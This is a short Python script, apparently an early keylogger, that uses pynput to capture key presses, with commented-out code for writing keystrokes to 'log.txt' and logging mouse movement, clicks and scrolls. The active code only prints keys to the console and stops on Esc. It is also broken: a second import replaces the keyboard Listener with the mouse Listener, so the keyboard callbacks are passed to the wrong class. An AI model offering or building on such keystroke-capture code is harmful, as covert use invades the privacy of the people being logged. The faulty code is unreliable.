import os.path,logging as log,numpy as np
from pynput import mouse
from pynput.keyboard import Key,Listener
from pynput.mouse import Listener

log.basicConfig(
    filename= 'log.txt',
    level = log.DEBUG,
    format = '%(asctime)s - %(message)s'
)

def on_press(key):
    # key_str = str(key).replace("'","")
    # with open('log.txt','a') as f:
    #     if key_str == 'Key.space':
    #         f.write(" ")
    #     elif len(key_str) >1:
    #         f.write('\n' + key_str  + '\n')
    #     else:f.write(log.info(key_str))
    print(f'{key} pressed')

# def on_move(x, y):
#     log.info("Mouse moved to ({0}, {1})".format(x, y))

# def on_click(x, y, button, pressed):
#     if pressed:
#         log.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

# def on_scroll(x, y, dx, dy):
#     log.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press,on_release=on_release) as listener:
    listener.join()